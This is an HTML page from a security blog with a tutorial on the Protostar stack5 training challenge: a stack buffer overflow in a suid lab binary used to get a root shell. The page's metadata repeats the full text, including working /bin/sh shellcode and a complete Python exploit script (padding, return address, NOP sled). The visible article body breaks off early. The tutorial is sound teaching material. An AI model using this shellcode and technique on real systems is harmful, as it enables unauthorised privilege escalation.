<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5 | 0xRick Owned Root !</title>
<meta name="generator" content="Jekyll v3.7.4" />
<meta property="og:title" content="Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Introduction Hey I’m back with another Buffer Overflow article and today we are going to do a really interesting exploit , Today we will finally escalate privileges using a vulnerable suid binary (you can know more about that by reading the first buffer overflow article) , I will also cover some interesting topics to fully understand this exploit. This is also the most realistic exploit so far. All the previous exploits wanted us to change a variable , execute a function .. stuff that are more like CTF but this time we have a realistic situation , Without wasting more time let’s just jump right in. Read the previous articles first , if you haven’t done yet. ./Stack5 We have the source like all the previous challenges but this time it’s actually not important. #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc, char **argv) { char buffer[64]; gets(buffer); } It just takes our input and stores it in the buffer , it doesn’t even tell us about the buffer size. What about char buffer[64]; ? like stack4 if we tried 64 chars it won’t even crash. with that being said let’s start. As always we will start by finding out if the binary vulnerable or not (yea we already know that but it’s an important enumeration step) python -c &quot;print &#39;A&#39; * 100&quot; | ./stack5 Segmentation fault. So it crashes before 100 chars , next step is to know where exactly does it crash. We will use metasploit pattern_create and pattern_offset , I explained how does this work in stack3 ./pattern_create.rb -l 100 Then we will run gdb and create a break point at main() , run the program after the break point we make it continue then pass our pattern break main run c It crashes at 0x63413563 , now we will use pattern_offset ./pattern_offset.rb -q 63413563 And we get exact match at offset 76. As I said before we will exploit this binary to get a root shell , but how to know if it’s a suid binary or not ? we can simply use find to know that find /opt/protostar/bin/ -perm -4000 | grep stack5 And we get /opt/protostar/bin/stack5 , if it wasn’t a suid binary we wouldn’t get any output. If you are just searching for suid binaries you can remove the grep command and it will list all suid binaries in the specified directory. Fun with gdb , finding EIP Now let’s run gdb again and start getting useful information. Before we start I have to say that the memory addresses may differ , so mine won’t be the same as yours. Last time we have overwritten the EIP address with the address of win() function . This time we don’t have a function to execute ,we have to find the address of the EIP and make it point to our “evil input” (shellcode), I will explain in a moment. We will set the disassembly flavor to intel set disassembly-flavor intel Then we will disassemble the main function disassemble main By looking at that we can identify the best place to set our break point , and it’s gonna be before the leave instruction , leave is right before the return instruction , next to leave we see the address 0x080483d9 so we will type : break *0x080483d9 Then we will run the program and pass any input , many A’s is always good It will execute and stop at the breakpoint , by typing info frame we can get the EIP address info frame The last 2 lines show saved registers : eip at 0xbffff77c Another way to get the buffer size Let’s take a break and take a quick look at another way to get the buffer size , I wanted to show this quickly because we have already done 50 % of it .. Metasploit is cool but what if we don’t have metasploit in some situation ? We can do it manually by calculating the distance between the buffer start address and the EIP address , We have already got the EIP address so let’s get the start of the buffer. If we type x/24wx $esp it will show us (x/) 24 (24wx) words at the top of the stack ($esp). x/24wx $esp At the second line we see this address 0xbffff730 and it holds values of 0x41414141 and we already know that 41 is the hex of “A” which was our input to the program so we know that this address is where the buffer starts. We know that the buffer comes first then the EIP so the EIP’s address is greater than the buffer’s address. We will substract them from each other: p/d 0xbffff77c - 0xbffff730 And we get 76 , the same result we got using metasploit. That was another practical way to find the buffer’s size. Idea of the exploit before we build our exploit let’s just understand the idea of the exploit. we will fill the buffer with “A” as always , we will reach the EIP and overwrite it with a new address that points to our shell code (4 bytes after), then we will add something called NOP (No Operation) , then finally the shellcode. Let’s breakdown everything. ShellCode So what’s a shellcode ? Simply it’s a piece of code (“written in hex in our situation”) that we use as a payload to execute something . /bin/sh for example. And this binary is suid … so if we execute shellcode that executes /bin/sh with the binary we will get a root shell. You can get shellcodes from shell-storm or from exploit-db , of course there are a lot of other resources , I’m just giving examples. This is the shellcode we are going to use for this challenge : \x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80 This shellcode executes /bin/sh NOP (No Operation) Basically no operation is used to make sure that our exploit doesn’t fail , because we won’t always point to the right address , so we add stuff that doesn’t do anything and we point to them , Then when the program executes it will reach those NOPs and keeps executing them (does nothing) until it reaches the shellcode. Building the exploit In the last challenges a single python print statement solved it. This time it will be a mess so we will create a small exploit with python. First thing we will import a module called struct , I will explain why in a moment. import struct Then we will create a variable the holds the padding (the chars to fill the buffer) pad = &quot;\x41&quot; * 76 After it fills the buffer it will hit the EIP , we need the new EIP address that we will assign , as I said above we need it to be the address of the following instruction (4 bytes after the original EIP address) so it will be 0xbffff77c + 4 , google can simply give you the answer :D . it will be 0xbffff780 . We will add that value to a variable but remember we need it in reverse , That’s why struct is important. if you do import struct;struct.pack(&quot;I&quot; , 0xbffff780) from the python interpreter it will print \x80\xf7\xff\xbf , it makes life easier :D EIP = struct.pack(&quot;I&quot;, 0xbffff780) Then comes our shellcode shellcode = &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot; Last thing is the NOP , it can be anything , so 100 chars will be good NOP = &quot;\x90&quot; * 100 Ok our exploit is ready , we just need to print out the final payload so : print pad + EIP + NOP + shellcode Let’s take a look at the script : import struct pad = &quot;\x41&quot; * 76 EIP = struct.pack(&quot;I&quot;, 0xbffff780) shellcode = &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot; NOP = &quot;\x90&quot; * 100 print pad + EIP + NOP + shellcode Applying the exploit Now it’s show time ! let’s test it out. python /tmp/stack5.py | ./stack5 And we got a root shell ! That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4" />
<meta property="og:description" content="Introduction Hey I’m back with another Buffer Overflow article and today we are going to do a really interesting exploit , Today we will finally escalate privileges using a vulnerable suid binary (you can know more about that by reading the first buffer overflow article) , I will also cover some interesting topics to fully understand this exploit. This is also the most realistic exploit so far. All the previous exploits wanted us to change a variable , execute a function .. stuff that are more like CTF but this time we have a realistic situation , Without wasting more time let’s just jump right in. Read the previous articles first , if you haven’t done yet. ./Stack5 We have the source like all the previous challenges but this time it’s actually not important. #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc, char **argv) { char buffer[64]; gets(buffer); } It just takes our input and stores it in the buffer , it doesn’t even tell us about the buffer size. What about char buffer[64]; ? like stack4 if we tried 64 chars it won’t even crash. with that being said let’s start. As always we will start by finding out if the binary vulnerable or not (yea we already know that but it’s an important enumeration step) python -c &quot;print &#39;A&#39; * 100&quot; | ./stack5 Segmentation fault. So it crashes before 100 chars , next step is to know where exactly does it crash. We will use metasploit pattern_create and pattern_offset , I explained how does this work in stack3 ./pattern_create.rb -l 100 Then we will run gdb and create a break point at main() , run the program after the break point we make it continue then pass our pattern break main run c It crashes at 0x63413563 , now we will use pattern_offset ./pattern_offset.rb -q 63413563 And we get exact match at offset 76. As I said before we will exploit this binary to get a root shell , but how to know if it’s a suid binary or not ? we can simply use find to know that find /opt/protostar/bin/ -perm -4000 | grep stack5 And we get /opt/protostar/bin/stack5 , if it wasn’t a suid binary we wouldn’t get any output. If you are just searching for suid binaries you can remove the grep command and it will list all suid binaries in the specified directory. Fun with gdb , finding EIP Now let’s run gdb again and start getting useful information. Before we start I have to say that the memory addresses may differ , so mine won’t be the same as yours. Last time we have overwritten the EIP address with the address of win() function . This time we don’t have a function to execute ,we have to find the address of the EIP and make it point to our “evil input” (shellcode), I will explain in a moment. We will set the disassembly flavor to intel set disassembly-flavor intel Then we will disassemble the main function disassemble main By looking at that we can identify the best place to set our break point , and it’s gonna be before the leave instruction , leave is right before the return instruction , next to leave we see the address 0x080483d9 so we will type : break *0x080483d9 Then we will run the program and pass any input , many A’s is always good It will execute and stop at the breakpoint , by typing info frame we can get the EIP address info frame The last 2 lines show saved registers : eip at 0xbffff77c Another way to get the buffer size Let’s take a break and take a quick look at another way to get the buffer size , I wanted to show this quickly because we have already done 50 % of it .. Metasploit is cool but what if we don’t have metasploit in some situation ? We can do it manually by calculating the distance between the buffer start address and the EIP address , We have already got the EIP address so let’s get the start of the buffer. If we type x/24wx $esp it will show us (x/) 24 (24wx) words at the top of the stack ($esp). x/24wx $esp At the second line we see this address 0xbffff730 and it holds values of 0x41414141 and we already know that 41 is the hex of “A” which was our input to the program so we know that this address is where the buffer starts. We know that the buffer comes first then the EIP so the EIP’s address is greater than the buffer’s address. We will substract them from each other: p/d 0xbffff77c - 0xbffff730 And we get 76 , the same result we got using metasploit. That was another practical way to find the buffer’s size. Idea of the exploit before we build our exploit let’s just understand the idea of the exploit. we will fill the buffer with “A” as always , we will reach the EIP and overwrite it with a new address that points to our shell code (4 bytes after), then we will add something called NOP (No Operation) , then finally the shellcode. Let’s breakdown everything. ShellCode So what’s a shellcode ? Simply it’s a piece of code (“written in hex in our situation”) that we use as a payload to execute something . /bin/sh for example. And this binary is suid … so if we execute shellcode that executes /bin/sh with the binary we will get a root shell. You can get shellcodes from shell-storm or from exploit-db , of course there are a lot of other resources , I’m just giving examples. This is the shellcode we are going to use for this challenge : \x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80 This shellcode executes /bin/sh NOP (No Operation) Basically no operation is used to make sure that our exploit doesn’t fail , because we won’t always point to the right address , so we add stuff that doesn’t do anything and we point to them , Then when the program executes it will reach those NOPs and keeps executing them (does nothing) until it reaches the shellcode. Building the exploit In the last challenges a single python print statement solved it. This time it will be a mess so we will create a small exploit with python. First thing we will import a module called struct , I will explain why in a moment. import struct Then we will create a variable the holds the padding (the chars to fill the buffer) pad = &quot;\x41&quot; * 76 After it fills the buffer it will hit the EIP , we need the new EIP address that we will assign , as I said above we need it to be the address of the following instruction (4 bytes after the original EIP address) so it will be 0xbffff77c + 4 , google can simply give you the answer :D . it will be 0xbffff780 . We will add that value to a variable but remember we need it in reverse , That’s why struct is important. if you do import struct;struct.pack(&quot;I&quot; , 0xbffff780) from the python interpreter it will print \x80\xf7\xff\xbf , it makes life easier :D EIP = struct.pack(&quot;I&quot;, 0xbffff780) Then comes our shellcode shellcode = &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot; Last thing is the NOP , it can be anything , so 100 chars will be good NOP = &quot;\x90&quot; * 100 Ok our exploit is ready , we just need to print out the final payload so : print pad + EIP + NOP + shellcode Let’s take a look at the script : import struct pad = &quot;\x41&quot; * 76 EIP = struct.pack(&quot;I&quot;, 0xbffff780) shellcode = &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot; NOP = &quot;\x90&quot; * 100 print pad + EIP + NOP + shellcode Applying the exploit Now it’s show time ! let’s test it out. python /tmp/stack5.py | ./stack5 And we got a root shell ! That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4" />
<link rel="canonical" href="http://localhost:4000/binary-exploitation/bof5/" />
<meta property="og:url" content="http://localhost:4000/binary-exploitation/bof5/" />
<meta property="og:site_name" content="0xRick Owned Root !" />
<meta property="og:image" content="http://localhost:4000/binary-exploitation/BOF5/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-01-17T00:00:00+02:00" />
<script type="application/ld+json">
{"datePublished":"2019-01-17T00:00:00+02:00","image":"http://localhost:4000/binary-exploitation/BOF5/0.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/binary-exploitation/bof5/"},"@type":"BlogPosting","url":"http://localhost:4000/binary-exploitation/bof5/","headline":"Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5","description":"Introduction Hey I’m back with another Buffer Overflow article and today we are going to do a really interesting exploit , Today we will finally escalate privileges using a vulnerable suid binary (you can know more about that by reading the first buffer overflow article) , I will also cover some interesting topics to fully understand this exploit. This is also the most realistic exploit so far. All the previous exploits wanted us to change a variable , execute a function .. stuff that are more like CTF but this time we have a realistic situation , Without wasting more time let’s just jump right in. Read the previous articles first , if you haven’t done yet. ./Stack5 We have the source like all the previous challenges but this time it’s actually not important. #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc, char **argv) { char buffer[64]; gets(buffer); } It just takes our input and stores it in the buffer , it doesn’t even tell us about the buffer size. What about char buffer[64]; ? like stack4 if we tried 64 chars it won’t even crash. with that being said let’s start. As always we will start by finding out if the binary vulnerable or not (yea we already know that but it’s an important enumeration step) python -c &quot;print &#39;A&#39; * 100&quot; | ./stack5 Segmentation fault. So it crashes before 100 chars , next step is to know where exactly does it crash. We will use metasploit pattern_create and pattern_offset , I explained how does this work in stack3 ./pattern_create.rb -l 100 Then we will run gdb and create a break point at main() , run the program after the break point we make it continue then pass our pattern break main run c It crashes at 0x63413563 , now we will use pattern_offset ./pattern_offset.rb -q 63413563 And we get exact match at offset 76. As I said before we will exploit this binary to get a root shell , but how to know if it’s a suid binary or not ? we can simply use find to know that find /opt/protostar/bin/ -perm -4000 | grep stack5 And we get /opt/protostar/bin/stack5 , if it wasn’t a suid binary we wouldn’t get any output. If you are just searching for suid binaries you can remove the grep command and it will list all suid binaries in the specified directory. Fun with gdb , finding EIP Now let’s run gdb again and start getting useful information. Before we start I have to say that the memory addresses may differ , so mine won’t be the same as yours. Last time we have overwritten the EIP address with the address of win() function . This time we don’t have a function to execute ,we have to find the address of the EIP and make it point to our “evil input” (shellcode), I will explain in a moment. We will set the disassembly flavor to intel set disassembly-flavor intel Then we will disassemble the main function disassemble main By looking at that we can identify the best place to set our break point , and it’s gonna be before the leave instruction , leave is right before the return instruction , next to leave we see the address 0x080483d9 so we will type : break *0x080483d9 Then we will run the program and pass any input , many A’s is always good It will execute and stop at the breakpoint , by typing info frame we can get the EIP address info frame The last 2 lines show saved registers : eip at 0xbffff77c Another way to get the buffer size Let’s take a break and take a quick look at another way to get the buffer size , I wanted to show this quickly because we have already done 50 % of it .. Metasploit is cool but what if we don’t have metasploit in some situation ? We can do it manually by calculating the distance between the buffer start address and the EIP address , We have already got the EIP address so let’s get the start of the buffer. If we type x/24wx $esp it will show us (x/) 24 (24wx) words at the top of the stack ($esp). x/24wx $esp At the second line we see this address 0xbffff730 and it holds values of 0x41414141 and we already know that 41 is the hex of “A” which was our input to the program so we know that this address is where the buffer starts. We know that the buffer comes first then the EIP so the EIP’s address is greater than the buffer’s address. We will substract them from each other: p/d 0xbffff77c - 0xbffff730 And we get 76 , the same result we got using metasploit. That was another practical way to find the buffer’s size. Idea of the exploit before we build our exploit let’s just understand the idea of the exploit. we will fill the buffer with “A” as always , we will reach the EIP and overwrite it with a new address that points to our shell code (4 bytes after), then we will add something called NOP (No Operation) , then finally the shellcode. Let’s breakdown everything. ShellCode So what’s a shellcode ? Simply it’s a piece of code (“written in hex in our situation”) that we use as a payload to execute something . /bin/sh for example. And this binary is suid … so if we execute shellcode that executes /bin/sh with the binary we will get a root shell. You can get shellcodes from shell-storm or from exploit-db , of course there are a lot of other resources , I’m just giving examples. This is the shellcode we are going to use for this challenge : \\x31\\xc0\\x31\\xdb\\xb0\\x06\\xcd\\x80\\x53\\x68/tty\\x68/dev\\x89\\xe3\\x31\\xc9\\x66\\xb9\\x12\\x27\\xb0\\x05\\xcd\\x80\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80 This shellcode executes /bin/sh NOP (No Operation) Basically no operation is used to make sure that our exploit doesn’t fail , because we won’t always point to the right address , so we add stuff that doesn’t do anything and we point to them , Then when the program executes it will reach those NOPs and keeps executing them (does nothing) until it reaches the shellcode. Building the exploit In the last challenges a single python print statement solved it. This time it will be a mess so we will create a small exploit with python. First thing we will import a module called struct , I will explain why in a moment. import struct Then we will create a variable the holds the padding (the chars to fill the buffer) pad = &quot;\\x41&quot; * 76 After it fills the buffer it will hit the EIP , we need the new EIP address that we will assign , as I said above we need it to be the address of the following instruction (4 bytes after the original EIP address) so it will be 0xbffff77c + 4 , google can simply give you the answer :D . it will be 0xbffff780 . We will add that value to a variable but remember we need it in reverse , That’s why struct is important. if you do import struct;struct.pack(&quot;I&quot; , 0xbffff780) from the python interpreter it will print \\x80\\xf7\\xff\\xbf , it makes life easier :D EIP = struct.pack(&quot;I&quot;, 0xbffff780) Then comes our shellcode shellcode = &quot;\\x31\\xc0\\x31\\xdb\\xb0\\x06\\xcd\\x80\\x53\\x68/tty\\x68/dev\\x89\\xe3\\x31\\xc9\\x66\\xb9\\x12\\x27\\xb0\\x05\\xcd\\x80\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80&quot; Last thing is the NOP , it can be anything , so 100 chars will be good NOP = &quot;\\x90&quot; * 100 Ok our exploit is ready , we just need to print out the final payload so : print pad + EIP + NOP + shellcode Let’s take a look at the script : import struct pad = &quot;\\x41&quot; * 76 EIP = struct.pack(&quot;I&quot;, 0xbffff780) shellcode = &quot;\\x31\\xc0\\x31\\xdb\\xb0\\x06\\xcd\\x80\\x53\\x68/tty\\x68/dev\\x89\\xe3\\x31\\xc9\\x66\\xb9\\x12\\x27\\xb0\\x05\\xcd\\x80\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80&quot; NOP = &quot;\\x90&quot; * 100 print pad + EIP + NOP + shellcode Applying the exploit Now it’s show time ! let’s test it out. python /tmp/stack5.py | ./stack5 And we got a root shell ! That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4","dateModified":"2019-01-17T00:00:00+02:00","@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2019-01-17T00:00:00+02:00" itemprop="datePublished">Jan 17, 2019
      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
</p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <hr />

<h3 id="introduction">Introduction</h3>
<h4 id="hey-im-back-with-another-buffer-overflow-article-and-today-we-are-going-to-do-a-really-interesting-exploit--today-we-will-finally-escalate-privileges-using-a-vulnerable-suid-binary-you-can-know-more-about-that-by-reading-the-first-buffer-overflow-article--i-will-also-cover-some-interesting-topics-to-fully-understand-this-exploit-this-is-also-the-most-realistic-exploit-so-far-all-the-previous-exploits-wanted-us-to-change-a-variable--execute-a-function--stuff-that-are-more-like-ctf-but-this-time-we-have-a-realistic-situation--without-wasting-more-time-lets-just-jump-right-in">Hey I’m back with another Buffer Overflow article and today we are going to do a really interesting exploit , Today we will finally escalate privileges using a vulnerable suid binary (you can know more about that by reading the <a href="/binary-exploitation/bof1/">first buffer overflow article</a>) , I will also cover some interesting topics to fully understand this exploit. This is also the most realistic exploit so far. All the previous exploits wanted us to change a variable , execute a function .. stuff that are more like CTF but this time we have a realistic situation , Without wasting more time let’s just jump right in.</h4>
<h4 id="read-the-previous-articles-first--if-you-havent-done-yet">Read the <a href="/categories">previous articles</a> first , if you haven’t done yet.</h4>
<p><img src="/images/binary-exploitation/BOF5/0.png" alt="" /></p>
<hr />

<h3 id="stack5">./Stack5</h3>
<h4 id="we-have-the-source-like-all-the-previous-challenges-but-this-time-its-actually-not-important">We have the source like all the previous challenges but this time it’s actually not important.</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv)
{
 char buffer[64];

 gets(buffer);
}
</code></pre></div></div>
<h4 id="it-just-takes-our-input-and-stores-it-in-the-buffer--it-doesnt-even-tell-us-about-the-buffer-size-what-about-char-buffer64---like-stack4-if-we-tried-64-chars-it-wont-even-crash-with-that-being-said-lets-start">It just takes our input and stores it in the buffer , it doesn’t even tell us about the buffer size. What about <code class="highlighter-rouge">char buffer[64];</code> ?  like <a href="/binary-exploitation/bof4/">stack4</a> if we tried 64 chars it won’t even crash. with that being said let’s start.</h4>
<h4 id="as-always-we-will-start-by-finding-out-if-the-binary-vulnerable-or-not-yea-we-already-know-that-but-its-an-important-enumeration-step">As always we will start by finding out if the binary vulnerable or not (yea we already know that but it’s an important enumeration step)</h4>
<p><code class="highlighter-rouge">python -c "print 'A' * 100" | ./stack5</code>
<img src="/images/binary-exploitation/BOF5/1.png" alt="" /></p>
<h4 id="segmentation-fault-so-it-crashes-before-100-chars--next-step-is-to-know-where-exactly-does-it-crash-we-will-use-metasploit-pattern_create-and-pattern_offset--i-explained-how-does-this-work-in-stack3">Segmentation fault. So it crashes before 100 chars , next step is to know where exactly does it crash. We will use metasploit <code class="highlighter-rouge">pattern_create</code> and <code class="highlighter-rouge">pattern_offset</code> , I explained how does this work in <a href="/binary-exploitation/bof3">stack3</a></h4>
<p><code class="highlighter-rouge">./pattern_create.rb -l 100</code>
<img src="/images/binary-exploitation/BOF5/2.png" alt="" /></p>
<h4 id="then-we-will-run-gdb-and-create-a-break-point-at-main--run-the-program-after-the-break-point-we-make-it-continue-then-pass-our-pattern">Then we will run gdb and create a break point at <code class="highlighter-rouge">main()</code> , <code class="highlighter-rouge">run</code> the program after the break point we make it continue then pass our pattern</h4>
<p><code class="highlighter-rouge">break main</code>
<br />
<code class="highlighter-rouge">run</code>
<br />
<code class="highlighter-rouge">c</code>
<img src="/images/binary-exploitation/BOF5/3.png" alt="" /></p>
<h4 id="it-crashes-at-0x63413563--now-we-will-use-pattern_offset">It crashes at <code class="highlighter-rouge">0x63413563</code> , now we will use <code class="highlighter-rouge">pattern_offset</code></h4>
<p><code class="highlighter-rouge">./pattern_offset.rb -q 63413563</code>
<img src="/images/binary-exploitation/BOF5/4.png" alt="" /></p>
<h4 id="and-we-get-exact-match-at-offset-76-as-i-said-before-we-will-exploit-this-binary-to-get-a-root-shell--but-how-to-know-if-its-a-suid-binary-or-not--we-can-simply-use-find-to-know-that">And we get exact match at offset 76. As I said before we will exploit this binary to get a root shell , but how to know if it’s a suid binary or not ? we can simply use <code class="highlighter-rouge">find</code> to know that</h4>
<p><code class="highlighter-rouge">find /opt/protostar/bin/ -perm -4000 | grep stack5</code>
<img src="/images/binary-exploitation/BOF5/5.png" alt="" /></p>
<h4 id="and-we-get-optprotostarbinstack5--if-it-wasnt-a-suid-binary-we-wouldnt-get-any-output-if-you-are-just-searching-for-suid-binaries-you-can-remove-the-grep-command-and-it-will-list-all-suid-binaries-in-the-specified-directory">And we get <code class="highlighter-rouge">/opt/protostar/bin/stack5</code> , if it wasn’t a suid binary we wouldn’t get any output. If you are just searching for suid binaries you can remove the <code class="highlighter-rouge">grep</code> command and it will list all suid binaries in the specified directory.</h4>
<p><br /></p>
<hr />

<h3 id="fun-with-gdb--finding-eip">Fun with gdb , finding EIP</h3>
<h4 id="now-lets-run-gdb-again-and-start-getting-useful-information-before-we-start-i-have-to-say-that-the-memory-addresses-may-differ--so-mine-wont-be-the-same-as-yours-last-time-we-have-overwritten-the-eip-address-with-the-address-of-win-function--this-time-we-dont-have-a-function-to-execute-we-have-to-find-the-address-of-the-eip-and-make-it-point-to-our-evil-input-shellcode-i-will-explain-in-a-moment">Now let’s run gdb again and start getting useful information. Before we start I have to say that the memory addresses may differ , so mine won’t be the same as yours. Last time we have overwritten the EIP address with the address of <code class="highlighter-rouge">win()</code> function . This time we don’t have a function to execute ,we have to find the address of the EIP and make it point to our “evil input” (shellcode), I will explain in a moment.</h4>
<h4 id="we-will-set-the-disassembly-flavor-to-intel">We will set the disassembly flavor to intel</h4>
<p><code class="highlighter-rouge">set disassembly-flavor intel</code></p>
<h4 id="then-we-will-disassemble-the-main-function">Then we will disassemble the main function</h4>
<p><code class="highlighter-rouge">disassemble main</code>
<img src="/images/binary-exploitation/BOF5/6.png" alt="" /></p>
<h4 id="by-looking-at-that-we-can-identify-the-best-place-to-set-our-break-point--and-its-gonna-be-before-the-leave-instruction--leave-is-right-before-the-return-instruction--next-to-leave-we-see-the-address-0x080483d9-so-we-will-type-">By looking at that we can identify the best place to set our break point , and it’s gonna be before the <code class="highlighter-rouge">leave</code> instruction , <code class="highlighter-rouge">leave</code> is right before the <code class="highlighter-rouge">return</code> instruction , next to <code class="highlighter-rouge">leave</code> we see the address <code class="highlighter-rouge">0x080483d9</code> so we will type :</h4>
<p><code class="highlighter-rouge">break *0x080483d9</code>
<img src="/images/binary-exploitation/BOF5/7.png" alt="" /></p>
<h4 id="then-we-will-run-the-program-and-pass-any-input--many-as-is-always-good">Then we will run the program and pass any input , many A’s is always good</h4>
<p><img src="/images/binary-exploitation/BOF5/8.png" alt="" /></p>
<h4 id="it-will-execute-and-stop-at-the-breakpoint--by-typing-info-frame-we-can-get-the-eip-address">It will execute and stop at the breakpoint , by typing <code class="highlighter-rouge">info frame</code> we can get the EIP address</h4>
<p><code class="highlighter-rouge">info frame</code>
<img src="/images/binary-exploitation/BOF5/9.png" alt="" /></p>
<h4 id="the-last-2-lines-show-saved-registers--eip-at-0xbffff77c">The last 2 lines show saved registers : eip at <code class="highlighter-rouge">0xbffff77c</code></h4>
<p><br /></p>
<hr />

<h3 id="another-way-to-get-the-buffer-size">Another way to get the buffer size</h3>
<h4 id="lets-take-a-break-and-take-a-quick-look-at-another-way-to-get-the-buffer-size--i-wanted-to-show-this-quickly-because-we-have-already-done-50--of-it-">Let’s take a break and take a quick look at another way to get the buffer size , I wanted to show this quickly because we have already done 50 % of it ..</h4>
<h4 id="metasploit-is-cool-but-what-if-we-dont-have-metasploit-in-some-situation--we-can-do-it-manually-by-calculating-the-distance-between-the-buffer-start-address-and-the-eip-address--we-have-already-got-the-eip-address-so-lets-get-the-start-of-the-buffer">Metasploit is cool but what if we don’t have metasploit in some situation ? We can do it manually by calculating the distance between the buffer start address and the EIP address , We have already got the EIP address so let’s get the start of the buffer.</h4>
